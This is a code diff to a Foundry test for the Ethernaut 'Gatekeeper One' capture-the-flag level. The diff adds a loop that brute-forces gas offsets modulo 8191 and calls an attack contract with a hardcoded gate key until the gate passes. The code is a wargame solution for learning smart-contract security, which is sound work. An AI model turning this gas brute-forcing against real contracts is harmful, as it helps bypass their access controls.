@@ -44,6 +44,17 @@ contract GatekeeperOneTest is DSTest {
     //i.e 0x0000???? == 0x????(of your tx.origin)
 
     bytes8 gateKey = 0x100000000000ea72;
+    uint mod = 8191;
+    uint gasToUse = 70000;
+
+    for(uint i = 0; i < mod; ++i) {
+      try gatekeeperOneHackContract.attack(gateKey, gasToUse + i) {
+        emit log_named_uint('Gate2 Pass', gasToUse + i);
+        break;
+
+      }
+      catch{}
+    }
     
 
 
@@ -56,7 +67,7 @@ contract GatekeeperOneTest is DSTest {
     bool challengeCompleted = ethernaut.submitLevelInstance(
         payable(levelAddress)
     );
-    vm.stopPrank();
+    vm.stopPrank(); 
     assert(challengeCompleted);
 
    }
